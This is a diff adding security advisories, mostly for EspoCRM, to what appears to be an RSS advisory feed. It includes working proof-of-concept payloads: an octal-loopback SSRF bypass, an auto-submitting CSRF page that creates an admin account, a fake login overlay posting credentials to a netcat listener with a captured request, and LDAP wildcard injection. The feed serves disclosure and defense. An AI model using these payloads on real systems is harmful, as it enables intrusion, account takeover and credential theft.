+* `HTTP 200 OK`&#13;
+* attachment created successfully&#13;
+&#13;
+Example response:&#13;
+&#13;
+```json&#13;
+{&#13;
+  "id":"69bdf9753eb144f20",&#13;
+  "name":"http://0177.0.0.1:9002/interno.png",&#13;
+  "type":"image/png",&#13;
+  "size":68,&#13;
+  "field":"avatar",&#13;
+  "parentType":"User"&#13;
+}&#13;
+```&#13;
+&#13;
+&lt;img width="1058" height="628" alt="6" src="https://github.com/user-attachments/assets/25093654-f7a3-4641-86c0-dc9026ac4cb2" /&gt;&#13;
+&#13;
+&#13;
+#### 4. Confirm the server-side request in the loopback listener&#13;
+&#13;
+Observed listener log:&#13;
+&#13;
+```text&#13;
+[Sat Mar 21 01:50:45 2026] 127.0.0.1:49250 Accepted&#13;
+[Sat Mar 21 01:50:45 2026] 127.0.0.1:49250 [200]: GET /interno.png&#13;
+[Sat Mar 21 01:50:45 2026] 127.0.0.1:49250 Closing&#13;
+```&#13;
+&#13;
+This confirms that the application made the request to the loopback-only listener.&#13;
+&#13;
+&lt;img width="567" height="68" alt="3" src="https://github.com/user-attachments/assets/4fd3864d-6184-4de5-88c6-0e41167b0d30" /&gt;&#13;
+&#13;
+&#13;
+---&#13;
+&#13;
+### Impact&#13;
+&#13;
+This is an authenticated SSRF vulnerability.&#13;
+&#13;
+Confirmed impact:&#13;
+&#13;
+* an authenticated user can bypass the internal-host restriction&#13;
+* the application can be forced to make requests to loopback-only services&#13;
+* in the confirmed `/api/v1/Attachment/fromImageUrl` flow, the fetched response can be stored as an attachment&#13;
+&#13;
+This may allow access to local-only services and other internal resources reachable from the application runtime.</description>
+      <guid isPermaLink="false">GHSA-h7gx-8gwv-7g73</guid>
+      <pubDate>Mon, 13 Apr 2026 10:30:38 +0000</pubDate>
     </item>
     <item>
       <title>[MEDIUM] zammad/zammad – Missing authorization in AI assistance controller for context data used in text tools</title>
@@ -5117,6 +6410,81 @@ A low-privileged user of the platform can install malicious code to obtain highe
       <description>Taiga API is vulnerable to Time‑based blind SQL injection allowing sensitive data disclosure via response timing.</description>
       <guid isPermaLink="false">GHSA-chm9-9wwq-xffj</guid>
       <pubDate>Tue, 28 Oct 2025 11:49:58 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Stored SVG &lt;a&gt; Injection Enabling CSRF-Based Arbitrary User Creation</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-c26c-wvhr-fr6r</link>
+      <description>### Summary&#13;
+_A vulnerability was discovered in the application that allows arbitrary user creation, including administrative accounts, by inserting a malicious &lt;svg&gt; &lt;a&gt; link into user-editable body.&#13;
+When an authenticated user clicks on the malicious link, they are redirected to an attacker controlled HTML page that executes a CSRF request against the api/v1/User endpoint.&#13;
+If the victim enters their credentials when prompted, the attacker-controlled account is created. &#13;
+This issue combines stored SVG injection with lack of CSRF protection on critical endpoints._&#13;
+&#13;
+&#13;
+### PoC&#13;
+An attacker with Knowledge Based edit permissions can embed the following payload in body field of the article creation/edition:&#13;
+`&lt;svg xmlns="http://www.w3.org/2000/svg" width="300" height="100"&gt;&#13;
+  &lt;a href="https://malicious.link/evil.html"&gt;&#13;
+    &lt;rect x="0" y="0" width="300" height="100" fill="#b3d9ff" stroke="#3399ff" stroke-width="2"&gt;&lt;/rect&gt;&#13;
+    &lt;text x="20" y="60" font-size="16" fill="black"&gt;Click here!!&lt;/text&gt;&#13;
+  &lt;/a&gt;&#13;
+&lt;/svg&gt;`&#13;
+&#13;
+The attacker can host the malicious .html file on a publicly accessible endpoint. In the example below, the target EspoCRM instance is deployed locally:&#13;
+````&#13;
+&lt;!DOCTYPE html&gt;&#13;
+&lt;html lang="en"&gt;&#13;
+&lt;head&gt;&#13;
+  &lt;meta charset="UTF-8"&gt;&#13;
+  &lt;title&gt;CSRF Create User&lt;/title&gt;&#13;
+&lt;/head&gt;&#13;
+&lt;body&gt;&#13;
+  &lt;h1&gt;CSRF Test&lt;/h1&gt;&#13;
+&#13;
+  &lt;!-- The form auto-submits when the page loads --&gt;&#13;
+  &lt;form id="csrfForm" action="http://127.0.0.1:8080/api/v1/User" method="POST"&gt;&#13;
+    &lt;input type="hidden" name="userName" value="eviluser"&gt;&#13;
+    &lt;input type="hidden" name="firstName" value="eviluser"&gt;&#13;
+    &lt;input type="hidden" name="lastName" value="evil"&gt;&#13;
+    &lt;input type="hidden" name="type" value="admin"&gt;&#13;
+    &lt;input type="hidden" name="isActive" value="true"&gt;&#13;
+    &lt;input type="hidden" name="password" value="eviluser"&gt;&#13;
+    &lt;input type="hidden" name="passwordConfirm" value="eviluser"&gt;&#13;
+  &lt;/form&gt;&#13;
+&#13;
+  &lt;script&gt;&#13;
+    document.getElementById('csrfForm').submit();&#13;
+  &lt;/script&gt;&#13;
+&lt;/body&gt;&#13;
+&lt;/html&gt;&#13;
+````&#13;
+&#13;
+&#13;
+&#13;
+An administrator can be socially engineered into clicking the malicious item and, upon authenticating within the trusted domain, a new attacker-controlled account with administrative privileges is created.&#13;
+&#13;
+&lt;img width="1920" height="523" alt="image" src="https://github.com/user-attachments/assets/f77a26f5-36d2-4e7d-8241-878c24333d70" /&gt;&#13;
+&lt;img width="701" height="851" alt="image" src="https://github.com/user-attachments/assets/5a9adf9c-d1c2-4864-9931-4af3d429fe53" /&gt;&#13;
+&lt;img width="1539" height="416" alt="image" src="https://github.com/user-attachments/assets/a71fd62a-8327-487a-864c-654640cfca67" /&gt;&#13;
+&#13;
+&#13;
+### Impact&#13;
+-Arbitrary user creation with attacker-controlled attributes, including administrator roles.&#13;
+&#13;
+-Privilege escalation.&#13;
+&#13;
+-Full compromise of the system if an administrator executes the malicious item.&#13;
+&#13;
+-Potential phishing due to the permissive remote file inclusion in the &lt;a&gt; tags.&#13;
+&#13;
+### Mitigations&#13;
+- Sanitize and restrict SVG/HTML rendering in user-editable fields.  &#13;
+- Validate Origin/Referer headers for requests to /api/v1/User.  &#13;
+- Restrict administrative actions to trusted domains via CSP.  &#13;
+&#13;
+</description>
+      <guid isPermaLink="false">GHSA-c26c-wvhr-fr6r</guid>
+      <pubDate>Tue, 14 Oct 2025 11:13:37 +0000</pubDate>
     </item>
     <item>
       <title>[MEDIUM] argoproj/argo-cd – DoS via credentials updates triggering a race condition  that crashes the Argo CD server</title>
@@ -5569,6 +6937,52 @@ https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Preve
       <pubDate>Wed, 03 Sep 2025 08:56:19 +0000</pubDate>
     </item>
     <item>
+      <title>[MEDIUM] espocrm/espocrm – Double slash in URI corrupting router cache leading to access denial</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-26x2-6wch-j8pf</link>
+      <description>### Impact&#13;
+If a user loads Espo in the browser with double slash (e.g `https://domain//#Admin)` and the webserver does not strip the double slash, it can cause a corrupted Slim router's cache. This will make the instance not usable until rebuild is done.&#13;
+&#13;
+### Patches&#13;
+Fixed in v9.1.7.&#13;
+&#13;
+### Workarounds&#13;
+Forbid double slash in web server configuration.&#13;
+&#13;
+</description>
+      <guid isPermaLink="false">GHSA-26x2-6wch-j8pf</guid>
+      <pubDate>Mon, 04 Aug 2025 17:29:34 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Improper neutralization of special elements used in an LDAP query ('LDAP Injection')</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-rjm8-77fr-4f3v</link>
+      <description>### Summary&#13;
+EspoCRM versions 9.1.5 (did not test on 9.1.6) and earlier are vulnerable to blind LDAP Injection when LDAP authentication is enabled. A remote, unauthenticated attacker can manipulate LDAP queries by injecting crafted input containing wildcard characters (e.g., *). This may allow the attacker to bypass authentication controls, enumerate valid usernames, or retrieve sensitive directory information depending on the LDAP server configuration.&#13;
+&#13;
+### Details&#13;
+An attacker can send crafted input, such as a wildcard (*) into the username parameter in the login form when LDAP authentication is enabled. The input is inserted into the LDAP query without proper sanitization, allowing the attacker to manipulate the filter.&#13;
+&#13;
+### PoC&#13;
+Will work only on LDAP enabled logins.&#13;
+Go to the login page, fill the username only with a wildcard (*).&#13;
+Next, you will be able to see in the logs the final LDAP query string and result from the server:&#13;
+![image](https://github.com/user-attachments/assets/8debd4cd-41bd-4b3d-9fb3-71747e926a7c)&#13;
+As seen here, the **findLdapUserDnByUsername($username)** function returns the first result out of many.&#13;
+&#13;
+For example sending 'al*' in the username will return the user 'alice':&#13;
+![image](https://github.com/user-attachments/assets/31b5983f-5947-4dd4-ae8c-c27851b29c78)&#13;
+&#13;
+&#13;
+### Impact&#13;
+Attacker may use blind LDAP injection to:&#13;
+A) Match valid usernames using wildcard queries.&#13;
+B) Brute-force user passwords via authentication attempts.&#13;
+C) Attempt field enumeration, though limited by lack of verbose error messages.&#13;
+D) Potentially cause denial of service (DoS) by sending expensive LDAP queries against large directories.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-rjm8-77fr-4f3v</guid>
+      <pubDate>Mon, 21 Jul 2025 15:36:40 +0000</pubDate>
+    </item>
+    <item>
       <title>[CRITICAL] argoproj/argo-cd – Cross-site scripting on repositories page</title>
       <link>https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</link>
       <description>### Impact&#13;
@@ -5701,6 +7115,167 @@ Mautic has patched this vulnerability by enforcing proper permission checks on p
 </description>
       <guid isPermaLink="false">GHSA-cqx4-9vqf-q3m8</guid>
       <pubDate>Wed, 28 May 2025 16:07:44 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – HTML Injection into phishing leads to account takeover</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-qrwp-v8v3-hqp2</link>
+      <description>### Summary&#13;
+HTML Injection in Knowledge Base articles leads to complete page defacement imitating the login page. Authenticated users with the read knowledge article privilege can browse to the KB article and if they submit their credentials, they get captured in plain text.&#13;
+&#13;
+### Details&#13;
+Vulnerability is allowed by overly permissive HTML editing being allowed on the KB aritcles.&#13;
+Tested on the latest docker image available, Version 9.0.6.&#13;
+&#13;
+### PoC&#13;
+1. An attacker with the privilege to create articles, can create one with the payload below:&#13;
+&#13;
+![image](https://github.com/user-attachments/assets/627645ef-4ff9-43ac-a8a2-8d1d9bb8013e)&#13;
+&#13;
+&#13;
+```&#13;
+&lt;div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f0f0f0; z-index: 9999; display: flex; justify-content: center; align-items: center;"&gt;&#13;
+    &lt;div id="login" class="panel panel-default block-center-sm"&gt;&#13;
+        &lt;div class="panel-heading"&gt;&#13;
+            &lt;div class="logo-container"&gt;&#13;
+                &lt;img src="client/img/logo-light.svg" class="logo"&gt;&#13;
+            &lt;/div&gt;&#13;
+        &lt;/div&gt;&#13;
+        &lt;div class="panel-body"&gt;&#13;
+            &lt;div class=""&gt;&#13;
+                &lt;form id="login-form" action="http://localhost/capture" method="POST"&gt;&#13;
+                    &lt;div class="form-group cell" data-name="username"&gt;&#13;
+                        &lt;label for="field-username"&gt;Username&lt;/label&gt;&#13;
+                        &lt;input type="text" name="username" id="field-userName" class="form-control" autocapitalize="off" spellcheck="false" tabindex="1" autocomplete="username" maxlength="255"&gt;&#13;
+                    &lt;/div&gt;&#13;
+                    &lt;div class="form-group cell" data-name="password"&gt;&#13;
+                        &lt;label for="login"&gt;Password&lt;/label&gt;&#13;
+                        &lt;input type="password" name="password" id="field-password" class="form-control" tabindex="2" autocomplete="current-password" maxlength="255"&gt;&#13;
+                    &lt;/div&gt;&#13;
+                    &lt;div class="margin-top-2x cell" data-name="submit"&gt;&#13;
+                        &lt;button type="submit" class="btn btn-primary btn-s-wide" id="btn-login" tabindex="3"&gt;Log in&lt;/button&gt;&#13;
+                    &lt;/div&gt;&#13;
+                &lt;/form&gt;&#13;
+            &lt;/div&gt;&#13;
+        &lt;/div&gt;&#13;
+    &lt;/div&gt;&#13;
+&lt;/div&gt;&#13;
+```&#13;
+&#13;
+2. The attacker obtains a shareable link as below.&#13;
+&#13;
+![image](https://github.com/user-attachments/assets/2a44f53b-c118-4eb2-a8c2-29afff48331d)&#13;
+&#13;
+3. The attacker starts a listener with netcat.&#13;
+```&#13;
+$ nc -lvnp 80&#13;
+listening on [any] 80 ...&#13;
+```&#13;
+&#13;
+5. The attacker shares the link `http://localhost:8082/#KnowledgeBaseArticle/view/67f68d75d91497a42` with the victim, and the victim opens it.&#13;
+&#13;
+![image](https://github.com/user-attachments/assets/361a3eb1-f9d4-49e8-a8d0-b50375d19901)&#13;
+&#13;
+6. The victim enters their credentials in the realistic "espocrm" login page, the attacker receives the request containing the plain text credentials.&#13;
+&#13;
+```&#13;
+$ nc -lvnp 80&#13;
+listening on [any] 80 ...&#13;
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 39186&#13;
+POST /capture HTTP/1.1&#13;
+Host: localhost&#13;
+Content-Length: 32&#13;
+Cache-Control: max-age=0&#13;
+sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"&#13;
+sec-ch-ua-mobile: ?0&#13;
+sec-ch-ua-platform: "Linux"&#13;
+Accept-Language: en-US,en;q=0.9&#13;
+Origin: http://localhost:8082&#13;
+Content-Type: application/x-www-form-urlencoded&#13;
+Upgrade-Insecure-Requests: 1&#13;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36&#13;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#13;
+Sec-Fetch-Site: same-site&#13;
+Sec-Fetch-Mode: navigate&#13;
+Sec-Fetch-User: ?1&#13;
+Sec-Fetch-Dest: document&#13;
+Referer: http://localhost:8082/&#13;
+Accept-Encoding: gzip, deflate, br&#13;
+Cookie: __clnds=x7crjo62wtq; next-auth.session-token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..gL1uKN_oMVBfg-5w.CjAsXj4aXCHmWZuPgwrhmHxppYTdkyWo9MEdoS7CTy_KuMYNql3IWhOxdkEYJXKoYkJtfYzKdk-WQ1yEKvdx5I1BHc1_-RHccmF8n44UthLf5SQDhkPZR3TEcDJhgzobuWZI6ex-W7keXSpvFyfzLlLJeoCap7OuzelnxZpVTxr_6Gd5gRpLavBM_8EqDxNr_hVZfhtEpuiQX_8heY1merqRpdsoarawblDFdy4XuwKLxkKF77oKo2gVFVeLy3WDA9E5ZrnR-UL7_1fJJSkndZdOJjCZdBKf6z0M1hvyt8F3iH4HEZtViRmiz4hOxx12yerrVy6dBxMOX8FA3YJ9-kMn8Mc5inFE4H-JDyrBXEyJTrtPiJc9PVEXhi37XSVXykj1u_dAPpm7tFil2MMzYzX9qE7QrhQWNcNhayX3-ZUF2bGdrVQgtdYIOugquIT1-5Czrh-i4eVUIlSDvoyQiWA6LPTgl4oaUUEq1g.GRwDQcb95dcNY8b4EIcPEw; auth-token-secret=3802d09cffc4f42aa8800828cb0444fc; auth-token=f8a442614c34d263e4995d8b1881864d&#13;
+Connection: keep-alive&#13;
+&#13;
+username=admin&amp;password=password&#13;
+```&#13;
+&#13;
+&#13;
+### Impact&#13;
+Any authenticated user with the privilege to read KB articles is impacted. In an enterprise with multiple applications, the malicious KB article could be edited to match the login pages of other applications, which would make it useful for credential harvesting against other applications as well.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-qrwp-v8v3-hqp2</guid>
+      <pubDate>Mon, 12 May 2025 07:23:52 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] espocrm/espocrm – Potential disclosure of sensitive information in the user sorting function</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-3ph3-jcfx-fq53</link>
+      <description>### Summary&#13;
+&#13;
+EspoCRM has a flaw that allows users to be sorted by their password hash. This flaw allows the attacker to make assumptions about the hash values of other users stored in the password column of the user table, based on the results of the sorted list of users. If the attacker knows the hash value of his password, sorting helps determine whether the other user's values are larger or smaller than the attacker's password based on the alphabetical sort. The attacker can change the password and repeat the sorting until the other user's password hash is fully revealed. The severity of this finding is set to Informational because the password hashing algorithm used is the Bcrypt algorithm, which involves the use of a randomly generated salt. The use of this algorithm for password hashing does not allow the attacker to know the value of his password hash in advance, as the same hashed password will have different hashing results.&#13;
+As part of the test, attempts were made to obtain other sensitive information, such as the value of the api_key. During a detailed inspection, the researcher found out that the sorting function returns only users with the type regular and admin, which does not allow to obtain api keys, since only users with the type api have them.&#13;
+&#13;
+### Impact&#13;
+&#13;
+This security issue affects only the values stored in the `user` table in the `espocrm` database. At the time of the tests, an attacker may be interested in only the `password` column in the `user` table, since it contains sensitive information that can be obtained through the flaw. Although the exploitation of this flaw is complicated by the use of the Bcrypt algorithm to hash passwords, an attacker could still exploit the flaw if an efficient way to obtain the value of his current password hash is found, for example, through other potential vulnerabilities. Disclosing user hashes will allow an attacker to efficiently search through the resulting hash to obtain the password in plaintext and take over the victim's account. &#13;
+It should also be noted that today the `user` table does not store any other sensitive information besides the password and API key. However, in future versions of EspoCRM, the `user` table may be expanded, which will put new columns with sensitive data at risk.&#13;
+&#13;
+### PoC&#13;
+&#13;
+The following screenshot demonstrates sorting users by the password column in descending order:&#13;
+&lt;img width="803" alt="Screenshot 2025-03-19 at 14 03 13" src="https://github.com/user-attachments/assets/c44b5ca3-e476-44ff-be87-55ec2e291377" /&gt;&#13;
+&#13;
+The following screenshot demonstrates sorting users by the password column in ascending order:&#13;
+&lt;img width="798" alt="Screenshot 2025-03-19 at 14 05 05" src="https://github.com/user-attachments/assets/194213c7-8b1c-447f-83dc-9d10646835ab" /&gt;&#13;
+&#13;
+As can be seen from the above screenshots, the server returns users in a different order when changing the value of order , which is responsible for the type of sorting in ascending or descending order.&#13;
+The following snippet is taken from the Mysql event log:&#13;
+&#13;
+```mysql&#13;
+SELECT&#13;
+user.id AS `id`,&#13;
+user.created_by_id AS `createdById`, user.type AS `type`,&#13;
+user.password AS `password`&#13;
+FROM&#13;
+`user` AS `user`&#13;
+WHERE&#13;
+user.type IN ('regular', 'admin') AND user.type &lt;&gt; 'super-admin' AND user.type &lt;&gt; 'system'&#13;
+AND user.deleted = 0&#13;
+ORDER BY&#13;
+user.password DESC, -- Sort by password &#13;
+user.id DESC&#13;
+LIMIT 0, 2;&#13;
+```&#13;
+&#13;
+The SQL query shows that the sorting is performed by the password column. If the two passwords are the same, which is unlikely with the Bcrypt algorithm, the sorting is done by user ID.&#13;
+&#13;
+</description>
+      <guid isPermaLink="false">GHSA-3ph3-jcfx-fq53</guid>
+      <pubDate>Wed, 16 Apr 2025 17:25:35 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Unrestricted Embedding in Iframe dashlet</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-2rf2-mj98-2fr8</link>
+      <description>### Impact&#13;
+Iframe dashlet allows user to display iframes with arbitrary URLs. As the sandbox attribute is not included in the iframe, the remote page can open popups outside of the iframe, potentially tricking users and creating a phishing risk.&#13;
+&#13;
+The iframe URL is user-defined, so an attacker would need to trick the user into specifying a malicious URL.&#13;
+&#13;
+The missing *sandbox* attribute also allows the remote page to send messages to the parent frame. However, EspoCRM does not make use of these messages.&#13;
+&#13;
+### Patches&#13;
+Fixed in v9.0.5&#13;
+&#13;
+Discovered by Mateusz Gierblinski.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-2rf2-mj98-2fr8</guid>
+      <pubDate>Tue, 15 Apr 2025 15:37:24 +0000</pubDate>
     </item>
     <item>
       <title>[HIGH] mautic/mautic – Improper Authorization in Reporting API</title>
@@ -6768,6 +8343,28 @@ Branch protection rules and review requirements are a great way to enforce secur
       <pubDate>Wed, 13 Mar 2024 20:11:33 +0000</pubDate>
     </item>
     <item>
+      <title>[MEDIUM] espocrm/espocrm – Weakness in "Forgot password"</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-8gv6-8r33-fm7j</link>
+      <description>### Summary&#13;
+An attacker can inject arbitrary IP or domain in "Password Change" page and redirect victim to malicious page that could lead to  credential stealing or another attack.&#13;
+### Details&#13;
+The main problem is that after changing the password, the user is shown a link to the login page, which, if the attack is successful, will redirect the user to the domain or IP controlled by the attacker.&#13;
+&#13;
+### PoC&#13;
+1) Go to login page and click on "Forgot Password?".&#13;
+2)  Enter "Username" and "Email" and submit this request (setting up BurpSuite to intercept this request).&#13;
+3) Go to "Proxy" tab in BurpSuite and intercept POST request to "/EspoCRM/api/v1/User/passwordChangeRequest" endpoint.&#13;
+4) Change "url" in intercepted request to any IP or domain.&#13;
+5) Once email received, click on password reset ling and change password after that click "Login" link on same page.&#13;
+6) Victim redirect to IP or domain that pointed in step 4.&#13;
+&#13;
+### Impact&#13;
+An attacker could use site clone tools to clone site login page and use it to steal credentials.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-8gv6-8r33-fm7j</guid>
+      <pubDate>Thu, 29 Feb 2024 10:48:37 +0000</pubDate>
+    </item>
+    <item>
       <title>[HIGH] composer/composer – Code execution and possible privilege escalation via compromised InstalledVersions.php or installed.php</title>
       <link>https://github.com/composer/composer/security/advisories/GHSA-7c6p-848j-wh5h</link>
       <description>### Impact&#13;
@@ -6846,6 +8443,35 @@ The Argo CD team would like to express their gratitude to An Trinh of [Calif](ht
 * The problem was originally reported in a [GitHub issue](https://github.com/argoproj/argo-cd/issues/2496)</description>
       <guid isPermaLink="false">GHSA-92mw-q256-5vwg</guid>
       <pubDate>Thu, 18 Jan 2024 20:50:57 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – SSRF via /Attachment/fromImageUrl endpoint</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-g955-rwxx-jvf6</link>
+      <description>### Summary&#13;
+There is SSRF via the upload image from url api.&#13;
+&#13;
+### Details&#13;
+Users that can use the /Attachment/fromImageUrl can specify URL to point to an internal host. Even though there is check for content type, it can be bypassed by redirects in some cases.&#13;
+&#13;
+### PoC&#13;
+Login as a user who can access attachments APIs, with credentials, make a post request to /api/v1/Attachment/fromImageUrl&#13;
+with the following data&#13;
+```&#13;
+{&#13;
+"url": "http://localhost:8888",&#13;
+"parentType": "Note",&#13;
+ "field":  "attachments"&#13;
+}&#13;
+``` &#13;
+On server side, listen on `localhost:8888` and it will receive a request, which normally shouldn't be accessible from outside.&#13;
+&#13;
+To bypass content type check, use a redirect, for example, by using `https://ssrf.localdomain.pw/img-with-body/301-http-127.0.0.1:8888-.i.jpg` as url, which spoofs the content type, and the actual response will be saved as an attachment. Then by using the /api/v1/Attachment/file/id endpoint the response can be retrieved.&#13;
+&#13;
+### Impact&#13;
+This SSRF can be leveraged to disclose internal information (in some cases), target internal hosts and bypass firewalls. &#13;
+See [here](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) for more information on SSRF and [here](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) for fix strategies</description>
+      <guid isPermaLink="false">GHSA-g955-rwxx-jvf6</guid>
+      <pubDate>Tue, 05 Dec 2023 12:34:24 +0000</pubDate>
     </item>
     <item>
       <title>[LOW] composer/composer – Remote Code Execution via web-accessible composer.phar</title>
